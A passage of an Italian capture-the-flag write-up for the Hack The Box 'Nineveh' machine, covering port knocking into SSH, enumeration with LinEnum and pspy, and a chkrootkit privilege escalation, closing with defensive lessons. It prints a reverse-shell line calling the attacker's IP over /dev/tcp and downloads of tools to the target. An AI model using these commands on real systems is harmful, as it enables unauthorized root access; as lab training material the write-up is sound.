root 1301  0.9  0.2   8756  2224 ?Ss   06:03   0:35 /usr/sbin/knockd -d -i ens160
...[snip]...

```

Cercando su google scopriamo che knockd è un demone per il port knocking, che imposterà determinate regole del firewall quando determinate porte vengono colpite in ordine. Possiamo trovare il file di configurazione in /etc/knockd.conf

```bash
www-data@nineveh:/var/www/ssl/secure_notes$ cat /etc/knockd.conf 
[options]
 logfile = /var/log/knockd.log
 interface = ens160

[openSSH]
 sequence = 571, 290, 911 
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

```

il file ci dice che che possiamo aprire SSH colpendo 571, 290 e poi 911 con syns, tutto entro 5 secondi, e così facendo, aggiungerà una regola per consentire al mio IP di raggiungere la porta 22.

scriviamo un semplice script dove andremo a dire ad [Nmap] di "bussare " in sequenza alle porte 571,290,911 ed infine ad di aprire una connessione SSH

```bash
for i in 571, 290, 911; do|
nmap -p ${i} --max-retries 0 -Pn 10.10.10.43
done

ssh -i nineveh.priv amrois@10.10.10.43|
```


1. Il loop "for" viene utilizzato per iterare su una lista di numeri di porta: 571, 290 e 911.
2. Per ogni iterazione del loop, viene eseguito il comando "nmap" per effettuare una scansione di porto sull'indirizzo IP 10.10.10.43 utilizzando la porta corrente specificata dalla variabile ${i}.
    - La flag "-p" specifica la porta da scansionare.
    - La flag "--max-retries 0" imposta il numero massimo di tentativi di connessione a 0, quindi non verranno effettuati nuovi tentativi dopo un fallimento.
    - La flag "-Pn" disabilita la scansione del ping, in modo che nmap non effettui un ping prima di eseguire la scansione di porta.
3. Dopo l'iterazione del loop, viene eseguito il comando "ssh" per connettersi a 10.10.10.43 come utente "amrois", utilizzando il file di chiave privata "nineveh.priv".

Gli diamo i permessi di esecuzione e eseguiamo lo script

```bash
┌──(root㉿kali)-[/home/…/htb/nineveh/_nineveh.png.extracted/secret]
└─# chmod +x knock.sh
┌──(root㉿kali)-[/home/…/htb/nineveh/_nineveh.png.extracted/secret]
└─# ./knock.sh
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 08:30 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
571/tcp filtered umeter

Nmap done: 1 IP address (1 host up) scanned in 1.28 seconds
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 08:30 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
290/tcp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.24 seconds
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-23 08:30 EDT
Warning: 10.10.10.43 giving up on port because retransmission cap hit (0).
Nmap scan report for nineveh.htb (10.10.10.43)
Host is up.

PORT    STATE    SERVICE
911/tcp filtered xact-backup

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Fri Jun 23 07:25:14 2023 from 10.10.14.34
amrois@nineveh:~$ id
uid=1000(amrois) gid=1000(amrois) groups=1000(amrois)
amrois@nineveh:~$ cat user.txt 
b8484d4a5054ee7e11abb5595d404d7a
```


## Root

Ci scarichiamo LinEnum.sh sulla macchina target

Come prima cosa tiriamo su un server nella cartella dove è presente LinEnum.sh

```bash
┌──(root㉿kali)-[/home/kali/tool/PrivEsc/LinEnum]
└─# python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

e dalla macchina target lo scarichiamo, gli diamo i permessi di esecuzione con chmod.

```bash
www-data@nineveh:/tmp$ wget http://10.10.14.34/LinEnum.sh
--2023-06-23 04:01:00--  http://10.10.14.34/LinEnum.sh
Connecting to 10.10.14.34:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'LinEnum.sh'

LinEnum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.1s    

2023-06-23 04:01:00 (468 KB/s) - 'LinEnum.sh' saved [46631/46631]

www-data@nineveh:/tmp$ ls
LinEnum.sh
f
systemd-private-4bf097846ffd4a6f90e70e21dcd2e6b2-systemd-timesyncd.service-VLza0Q
vmware-root
www-data@nineveh:/tmp$ chmod +x LinEnum.sh 
```

e lo eseguiamo 

```
www-data@nineveh:/tmp$ ./LinEnum.sh 

...<snip>....

[-] Listening TCP:                 
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name                                                                 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN       
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      tcp6       0      0 :::22                   :::*                    LISTEN                        
...<snip>...
```

Nella nostra scansione nmap, la porta 22 non è stata segnalata come aperta, tuttavia, lo script LinEnum la segnala come in ascolto su localhost. Non sono sicuro di cosa fare con questa informazione, ma la terrò in mente nel caso in cui non trovassi altro modo per aumentare i privilegi.
Quindi, proviamo con pspy.

```bash
www-data@nineveh:/tmp$ wget http://10.10.14.34/pspy64
--2023-06-23 04:23:16--  http://10.10.14.34/pspy64
Connecting to 10.10.14.34:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.96M  1.05MB/s    in 2.8s    

2023-06-23 04:23:18 (1.05 MB/s) - 'pspy64' saved [3104768/3104768]

www-data@nineveh:/tmp$ chmod +x pspy64 

```

e lo eseguiamo, analizzando l'output vediamo questo cronjob

```bash
2023/06/23 04:27:04 CMD: UID=0     PID=5544   | /bin/sh /usr/bin/chkrootkit 
2023/06/23 04:27:04 CMD: UID=0     PID=5546   | /bin/sh /usr/bin/chkrootkit 
```

Vediamo che ogni minuto circa viene eseguito il chkrootkit. Non l'avevo mai visto prima su una macchina, quindi l'ho cercato su Google e ho scoperto che si tratta di un programma destinato ad aiutare gli amministratori di sistema a controllare il loro sistema alla ricerca di rootkit noti. Successivamente, ho cercato su Google "escalation dei privilegi di chkrootkit" e sono arrivato a questo [exploit](https://www.exploit-db.com/exploits/33899).
Esiste una vulnerabilità di escalation dei privilegi con le versioni precedenti di questo software che eseguirà qualsiasi file eseguibile denominato /tmp/update come root. Pertanto, tutto ciò che dobbiamo fare è creare un file di "update" che contenga una shell inversa e attendere che l'attività pianificata ci fornisca una shell con privilegi di root.
Per farlo, andiamo alla directory /tmp e creiamo il file update. Nel file di `update` aggiungimo il seguente codice.

Possiamo anche cercare con searchsploit

```bash

┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# searchsploit  chkrootkit  
---------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit) | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation| linux/local/33899.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
Papers: No Results

```

```bash
www-data@nineveh: echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.34/1234 0>&1' > update

www-data@nineveh:/tmp$ cat update 
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.34/1234 0>&1
www-data@nineveh:/tmp$ 
```

Ci mettiamo in ascolto con nc 

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# nc -lnvp 1234
listening on [any] 1234 ...

```

Aspettiamo che il cronjob venga eseguito e otteniamo cosi la nostra shell da root

```bash
┌──(root㉿kali)-[/home/kali/htb/nineveh]
└─# nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.34] from (UNKNOWN) [10.10.10.43] 41628
bash: cannot set terminal process group (10166): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@nineveh:~# 
```

# LESSONS LEARNED

Per ottenere un punto d'appoggio iniziale sulla macchina abbiamo sfruttato cinque vulnerabilità.

1. Messaggio dettagliato sul modulo di accesso. Il messaggio di errore ci ha consentito di enumerare un nome utente valido. Pertanto, quando possibile, configurare sempre l'applicazione in modo che utilizzi messaggi di errore meno dettagliati. Un messaggio di errore migliore sarebbe "Il nome utente o la password non sono corretti".

2. Credenziali di accesso deboli. Abbiamo eseguito la forzatura bruta di due moduli di accesso utilizzando hydra. L'utente dovrebbe aver utilizzato una password sufficientemente lunga e difficile da decifrare.

3. Iniezione di codice PHP nella pagina phpLiteAdmin che ci ha permesso di archiviare un file dannoso sul server. Ciò avrebbe potuto essere evitato se l'utente avesse patchato il sistema e installato la versione più recente di phpLiteAdmin.

4. Vulnerabilità di inclusione di file locali (LFI) che ci ha consentito di richiamare ed eseguire il file dannoso archiviato sul server. Inoltre, siamo stati in grado di enumerare la sequenza di bussare alla porta e aprire la porta SSH utilizzando questa vulnerabilità. Ciò avrebbe potuto essere facilmente evitato se lo sviluppatore avesse convalidato l'input dell'utente.

5. Vulnerabilità alla divulgazione di informazioni. Questo è un gioco da ragazzi. Non rendere la tua chiave privata pubblicamente disponibile per la lettura da parte di chiunque, anche se è nascosta in un semplice sito.


Per aumentare i privilegi abbiamo sfruttato una vulnerabilità.

Un'attività pianificata (cornjob) che esegue una versione vulnerabile del software chkrootkit. Il software conteneva una vulnerabilità che ci ha permesso di passare ai privilegi di root. Ancora una volta, questo avrebbe potuto essere evitato se l'utente avesse patchato il sistema e installato la versione più recente del software.